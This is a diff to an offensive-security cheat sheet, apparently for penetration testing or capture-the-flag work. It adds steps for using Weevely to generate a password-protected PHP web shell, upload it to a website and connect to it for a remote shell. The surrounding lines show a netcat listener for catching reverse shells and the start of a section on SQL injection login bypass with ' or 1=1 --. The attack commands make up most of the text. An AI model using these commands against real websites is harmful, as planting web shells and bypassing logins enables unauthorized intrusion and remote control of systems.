@@ -238,6 +238,14 @@ run
 ```console
 nc -vnl -p 1234
 ```
+
+> [Weevely](https://www.kali.org/tools/weevely/) : Generate PHP Reverse shell
+```console
+weevely generate password123 /home/error.php
+ # Upload the above error.php to website and use the below cmd to get reverse shell
+
+weevely http://domain.com/error.php password123  
+```
   
 ### SQL Injection
 > Login bypass with [' or 1=1 --](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt) 
